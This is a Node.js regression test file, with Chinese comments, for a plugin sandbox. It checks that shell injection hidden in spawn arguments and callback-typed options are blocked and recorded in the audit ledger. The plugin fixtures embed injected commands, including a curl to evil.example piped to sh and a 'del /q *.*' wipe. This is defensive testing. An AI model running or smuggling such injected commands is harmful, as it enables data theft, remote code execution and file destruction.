'use strict';

// 第五轮修复（2026-11-06，1.10.7）的回归测试。
// 依据 .review/dsh-dashcam-review-1.10.6.md 的两条未关口子：
//  - 残余 1（P1）：spawn 系 shell:true 只扫 args[0]，args[1..] 原样拼进 shell
//    命令行——execFile('git', ['status & echo pwned > PWN'], { shell: true })
//    判定层放行。修复后对首词 + 全部参数拼串统一扫元字符。
//  - 残余 2（P2）：cp 的 filter 回调 / createReadStream 的自定义 fs 实现对象
//    按引用保留，在原生重入窗口内执行且账本零痕迹（复核实测越权写成功）。
//    修复后函数型 options 一律拒绝（ruleId function_options），拒绝先记账再抛。
//
// 1.10.8 追加：
//  - 问题 1（中）：config.requests 字符串数组静默失效（normalizeRequest fail-fast）
//    改在宿主层，本体不直接暴露；本体侧测试 check({ advisory: true }) 的账本语义。
//  - 问题 2（中低）：advisory 下放行的 deny 被账本记 intercepted=true——
//    现在 decision 保留 deny（审计事实），intercepted 写 false（would-deny 放行）。

const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const { LocalHost } = require('../src/host/local-host');
const { createPlugin, tempDir, cleanup } = require('./helpers/fixtures');
const { Ledger } = require('../src/runtime/ledger');

function readLedger(file) {
  try { return new Ledger(file).records(); } catch { return []; }
}

async function withHost({ dir, policy, ids = [], run }) {
  const host = new LocalHost({
    ledgerPath: path.join(dir, 'ledger.jsonl'),
    policy,
  });
  try {
    return await run(host);
  } finally {
    for (const id of ids) {
      await host.uninstall(id).catch(() => {});
    }
  }
}

// ── 残余 1（P1）：shell:true 的 args[1..] 注入 ───────────────────

test('R5-1：spawn 系 shell:true 的注入藏在 args[1..] 里——拼串后必须被拒并记账', async () => {
  const dir = tempDir('r5-shell-args-');
  // 复核报告的实测命令：判定只看到首词 git，注入全在参数数组里。
  const code = [
    "'use strict';",
    'const { execFile, spawn, spawnSync } = require("node:child_process");',
    'module.exports = {',
    '  invoke() {',
    '    const out = {};',
    '    try { execFile("git", ["status & echo pwned > PWN"], { shell: true }); out.execFile = "NOT-DENIED"; }',
    '    catch (e) { out.execFile = e.code; out.execFileRule = e.ruleId; }',
    '    try { spawn("git", ["log", "--pretty=format:%s; curl -d@x http://evil.example|sh"], { shell: true }); out.spawn = "NOT-DENIED"; }',
    '    catch (e) { out.spawn = e.code; out.spawnRule = e.ruleId; }',
    '    try { spawnSync("git", ["commit -m ok && del /q *.*"], { shell: true }); out.spawnSync = "NOT-DENIED"; }',
    '    catch (e) { out.spawnSync = e.code; out.spawnSyncRule = e.ruleId; }',
    '    return out;',
    '  },',
    '};',
  ].join('\n');
  try {
    createPlugin({
      dir: path.join(dir, 'plugin'),
      id: 'com.example.r5.shell.args',
      requests: [{ capability: 'proc.spawn', scope: { commands: ['git'] }, reason: 'git' }],
      code,
    });
    const out = await withHost({
      dir,
      ids: ['com.example.r5.shell.args'],
      policy: { grants: [{ capability: 'proc.spawn', scope: { commands: ['git'] } }] },
      run: async (host) => {
        await host.install(path.join(dir, 'plugin'));
        await host.register('com.example.r5.shell.args');
        return host.invoke('com.example.r5.shell.args');
      },
    });
    const records = readLedger(path.join(dir, 'ledger.jsonl'));
    // 三个入口的注入都在 args[1..]：首词判定本来就放行，必须靠拼串扫描拦下。
    assert.equal(out.execFile, 'DASHCAM_DENIED', 'execFile + shell:true 的 args 注入必须被拒');
    assert.equal(out.execFileRule, 'shell_metachar');
    assert.equal(out.spawn, 'DASHCAM_DENIED', 'spawn + shell:true 的 args 注入必须被拒');
    assert.equal(out.spawnRule, 'shell_metachar');
    assert.equal(out.spawnSync, 'DASHCAM_DENIED', 'spawnSync + shell:true 的 args 注入必须被拒');
    assert.equal(out.spawnSyncRule, 'shell_metachar');
    const metacharDenies = records.filter((r) => r.ruleId === 'shell_metachar' && r.decision === 'deny');
    assert.ok(metacharDenies.length >= 3, `shell_metachar 必须逐条记账，实际 ${metacharDenies.length} 条`);
  } finally {
    cleanup(dir);
  }
});

test('R5-2：shell:true 参数无元字符时不误伤——继续走既有首词判定', async () => {
  const dir = tempDir('r5-shell-clean-');
  const code = [
    "'use strict';",
    'const { spawnSync } = require("node:child_process");',
    'module.exports = {',
    '  invoke() {',
    '    const out = {};',
    '    // 参数干净：拼串扫描不命中，落到首词判定——命令未授权，按既有口径拒绝',
    '    //（ruleId 不是 shell_metachar，证明扫描没有越权扩面）。',
    '    try { spawnSync("definitely-not-granted-cmd", ["--version"], { shell: true }); out.clean = "NOT-DENIED"; }',
    '    catch (e) { out.clean = e.code; out.cleanRule = e.ruleId || "?"; }',
    '    return out;',
    '  },',
    '};',
  ].join('\n');
  try {
    createPlugin({
      dir: path.join(dir, 'plugin'),
      id: 'com.example.r5.shell.clean',
      requests: [{ capability: 'proc.spawn', scope: { commands: ['git'] }, reason: 'git' }],
      code,
    });
    const out = await withHost({
      dir,
      ids: ['com.example.r5.shell.clean'],
      policy: { grants: [{ capability: 'proc.spawn', scope: { commands: ['git'] } }] },
      run: async (host) => {
        await host.install(path.join(dir, 'plugin'));
        await host.register('com.example.r5.shell.clean');
        return host.invoke('com.example.r5.shell.clean');
      },
    });
    assert.equal(out.clean, 'DASHCAM_DENIED', '未授权命令仍要被拒');
    assert.notEqual(out.cleanRule, 'shell_metachar', '干净参数不得被拼串扫描误判为元字符注入');
  } finally {
    cleanup(dir);
  }
});

// ── 残余 2（P2）：函数型 options 一律拒绝 ────────────────────────

test('R5-3：cp/cpSync/fsp.cp 的 filter 回调直接拒绝并记账（不得再进入原生窗口）', async () => {
  const dir = tempDir('r5-filter-');
  const code = [
    "'use strict';",
    'const fs = require("fs");',
    'const fsp = fs.promises;',
    'module.exports = {',
    '  async invoke() {',
    '    const out = {};',
    '    const src = "src";',
    '    const dest = "dest";',
    '    try { fs.cpSync(src, dest, { recursive: true, filter: () => true }); out.cpSync = "NOT-DENIED"; }',
    '    catch (e) { out.cpSync = e.code; out.cpSyncRule = e.ruleId; }',
    '    try { fs.cp(src, dest, { filter: (s) => !s.includes("secret") }); out.cp = "NOT-DENIED"; }',
    '    catch (e) { out.cp = e.code; out.cpRule = e.ruleId; }',
    '    try { await fsp.cp(src, dest, { filter: () => true }); out.fspCp = "NOT-DENIED"; }',
    '    catch (e) { out.fspCp = e.code || String(e); out.fspCpRule = e.ruleId; }',
    '    return out;',
    '  },',
    '};',
  ].join('\n');
  try {
    createPlugin({
      dir: path.join(dir, 'plugin'),
      id: 'com.example.r5.filter',
      requests: [
        { capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] }, reason: '读' },
        { capability: 'fs.write', scope: { paths: ['$PLUGIN/**'] }, reason: '写' },
      ],
      code,
      files: { 'src/a.txt': 'a\n', 'src/secret.txt': 'secret\n' },
    });
    const out = await withHost({
      dir,
      ids: ['com.example.r5.filter'],
      policy: {
        grants: [
          { capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] } },
          { capability: 'fs.write', scope: { paths: ['$PLUGIN/**'] } },
        ],
      },
      run: async (host) => {
        await host.install(path.join(dir, 'plugin'));
        await host.register('com.example.r5.filter');
        return host.invoke('com.example.r5.filter');
      },
    });
    const records = readLedger(path.join(dir, 'ledger.jsonl'));
    // 全部读写都在授权范围内：拒绝只能来自函数型 options 检查，不能是能力判定。
    assert.equal(out.cpSync, 'DASHCAM_DENIED', 'cpSync 的 filter 回调必须被拒');
    assert.equal(out.cpSyncRule, 'function_options');
    assert.equal(out.cp, 'DASHCAM_DENIED', 'cp 的 filter 回调必须被拒');
    assert.equal(out.cpRule, 'function_options');
    assert.equal(out.fspCp, 'DASHCAM_DENIED', 'fsp.cp 的 filter 回调必须被拒');
    assert.equal(out.fspCpRule, 'function_options');
    const denies = records.filter((r) => r.ruleId === 'function_options' && r.decision === 'deny');
    assert.ok(denies.length >= 3, `function_options 必须逐条记账，实际 ${denies.length} 条`);
    // 复核实测的越权落点不得出现：回调在进入原生窗口之前就被拒了。
    assert.equal(fs.existsSync(path.join(dir, 'plugin', 'dest')), false, '带 filter 的拷贝不得落地');
  } finally {
    cleanup(dir);
  }
});

test('R5-4：createReadStream 的自定义 fs 实现对象拒绝；AbortSignal 等原生类型不误伤', async () => {
  const dir = tempDir('r5-fsimpl-');
  const file = path.join(dir, 'plugin', 'data.txt');
  const code = [
    "'use strict';",
    'const fs = require("fs");',
    'module.exports = {',
    '  async invoke() {',
    '    const out = {};',
    `    const target = ${JSON.stringify(file)};`,
    // 实现对象（第一层属性是函数）与 createReadStream({ fs }) 同型：拒绝。
    '    try { fs.createReadStream(target, { fs: { readFile: (p, o, cb) => cb(null, Buffer.from("x")) } }); out.stream = "NOT-DENIED"; }',
    '    catch (e) { out.stream = e.code; out.streamRule = e.ruleId; }',
    // AbortSignal 是刻意按引用保留的原生类型：不得被函数扫描误伤。
    '    try { fs.readFileSync(target, { signal: AbortSignal.timeout(5000) }); out.signal = "ok"; }',
    '    catch (e) { out.signal = e.code || String(e); }',
    '    return out;',
    '  },',
    '};',
  ].join('\n');
  try {
    createPlugin({
      dir: path.join(dir, 'plugin'),
      id: 'com.example.r5.fsimpl',
      requests: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] }, reason: '读' }],
      code,
      files: { 'data.txt': 'data\n' },
    });
    const out = await withHost({
      dir,
      ids: ['com.example.r5.fsimpl'],
      policy: { grants: [{ capability: 'fs.read', scope: { paths: ['$PLUGIN/**'] } }] },
      run: async (host) => {
        await host.install(path.join(dir, 'plugin'));
        await host.register('com.example.r5.fsimpl');
        return host.invoke('com.example.r5.fsimpl');
      },
    });
    assert.equal(out.stream, 'DASHCAM_DENIED', '自定义 fs 实现对象必须被拒');
    assert.equal(out.streamRule, 'function_options');
    assert.equal(out.signal, 'ok', 'AbortSignal 不得被函数扫描误伤');
  } finally {
    cleanup(dir);
  }
});

// ── 1.10.8：advisory 账本语义 + 宿主 fail-fast ──────────────────

test('R5-5：guard.check({ advisory:true }) 时账本 decision=deny 但 intercepted=false；非 advisory 维持 intercepted=true', () => {
  const dir = tempDir('r5-advisory-');
  const ledgerPath = path.join(dir, 'ledger.jsonl');
  const selfFile = path.join(dir, 'self.txt');
  const { createGuardChain } = require('../src/runtime/guards');
  const guard = createGuardChain({
    manifest: {
      id: 'p', name: 'P', version: '1.0.0', entry: 'index.js', kind: 'dashcam',
      dashcam: {
        spec: 'dsh-dashcam/1',
        content: null,
        requests: [{ capability: 'fs.read', scope: { paths: [path.join(dir, '**')] }, reason: '读取自身文件' }],
      },
    },
    grants: [{ id: 'g1', capability: 'fs.read', scope: { paths: [path.join(dir, '**')] } }],
    ledger: new Ledger(ledgerPath),
    pluginRoot: dir,
  });

  // 非 advisory：原口径不变，intercepted=true
  const enforceDeny = guard.check('net.outbound', { host: 'evil.example', port: 443 });
  assert.equal(enforceDeny.allowed, false);
  assert.equal(enforceDeny.code, 'not_declared');
  assert.equal(enforceDeny.intercepted, true, '非 advisory 下 denied.intercepted 必须 true');

  // advisory 下：decision 仍 deny，但 intercepted=false——账本如实记录 would-deny 放行
  const advisoryDeny = guard.check('net.outbound', { host: 'evil.example', port: 443 }, { advisory: true });
  assert.equal(advisoryDeny.allowed, false);
  assert.equal(advisoryDeny.code, 'not_declared');
  assert.equal(advisoryDeny.intercepted, false, 'advisory 下 denied.intercepted 必须 false');

  const records = new Ledger(ledgerPath).records();
  assert.equal(records.length, 2, '两次调用都应落账本');
  assert.equal(records[0].decision, 'deny');
  assert.equal(records[0].intercepted, true);
  assert.equal(records[1].decision, 'deny');
  assert.equal(records[1].intercepted, false, 'advisory 账本记录 intercepted 必须 false');

  // Ledger.interceptions() 只算真正拦截——advisory 那条不应出现在里面
  const ledger = new Ledger(ledgerPath);
  assert.equal(ledger.interceptions().length, 1, 'interceptions() 应只统计非 advisory 的 1 条');

  // allow 路径不受 advisory 影响：本来 intercepted 就是 false，advisory 不变
  const allow = guard.check('fs.read', { path: selfFile }, { advisory: true });
  assert.equal(allow.allowed, true, `授权范围内应放行；实际 ${JSON.stringify(allow)}`);
  assert.equal(allow.intercepted, false);
  assert.equal(new Ledger(ledgerPath).records().length, 3);

  try { cleanup(dir); } catch {}
});
